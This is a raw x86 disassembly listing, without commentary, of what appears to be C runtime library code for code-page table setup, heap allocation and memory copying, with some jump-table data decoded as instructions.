  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
